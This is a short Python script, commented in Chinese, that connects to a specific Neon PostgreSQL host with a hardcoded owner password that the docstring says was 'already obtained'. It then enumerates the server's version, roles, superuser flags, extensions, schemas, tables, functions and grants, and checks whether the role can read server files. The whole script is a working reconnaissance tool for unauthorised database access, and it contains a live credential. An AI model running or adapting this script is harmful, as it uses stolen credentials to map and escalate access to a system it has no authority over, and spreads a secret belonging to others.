# -*- coding: utf-8 -*-
"""PG 直连枚举:neondb_owner 密码已拿,psycopg 连接 compute 只读侦察"""
import psycopg

HOST = 'ep-crimson-fog-w2gucld1.us-east-2.aws.neon.build'
URI = 'postgresql://neondb_owner:npg_cI5ynlaAqjU2@%s/neondb' % HOST
print('try:', URI[:80])

conn = psycopg.connect(URI, connect_timeout=30)
cur = conn.cursor()

def q(sql):
    try:
        cur.execute(sql)
        return cur.fetchall()
    except Exception as e:
        return [('ERR', str(e)[:150])]

print('\n[1] version:', q('SELECT version()'))
print('[2] ctx:', q("SELECT current_user, current_database(), inet_server_addr(), inet_server_port()"))
print('[3] extensions:', q("SELECT extname, extversion FROM pg_extension ORDER BY 1"))
print('[4] my roles:', q("SELECT rolname, rolsuper, rolcreaterole, rolcreatedb, rolcanlogin, rolreplication FROM pg_roles ORDER BY 1"))
print('[5] neon gucs:', q("SELECT name, setting FROM pg_settings WHERE name LIKE '%neon%' OR name LIKE '%pg_version%' ORDER BY 1"))
print('[6] schemas:', q("SELECT nspname, nspowner::regrole::text FROM pg_namespace WHERE nspname NOT LIKE 'pg_%' AND nspname <> 'information_schema' ORDER BY 1"))
print('[7] public tables:', q("SELECT tablename FROM pg_tables WHERE schemaname='public' ORDER BY 1"))
print('[8] public funcs:', q("SELECT p.proname, pg_get_function_identity_arguments(p.oid) FROM pg_proc p JOIN pg_namespace n ON n.oid=p.pronamespace WHERE n.nspname='public' ORDER BY 1 LIMIT 30"))
print('[9] neon funcs:', q("SELECT p.proname FROM pg_proc p JOIN pg_namespace n ON n.oid=p.pronamespace WHERE n.nspname IN ('neon','neon_utils') ORDER BY 1 LIMIT 40"))

# 敏感面:能否读 server 文件/其他库/超管痕迹(只探测权限,不读内容)
print('[10] has pg_read_server_files:', q("SELECT rolname FROM pg_roles WHERE rolname=current_user AND (rolsuper OR pg_has_role(current_user,'pg_read_server_files','member'))"))
print('[11] table privs (public):', q("SELECT grantee, privilege_type FROM information_schema.role_table_grants WHERE table_schema='public' LIMIT 20"))
conn.close()
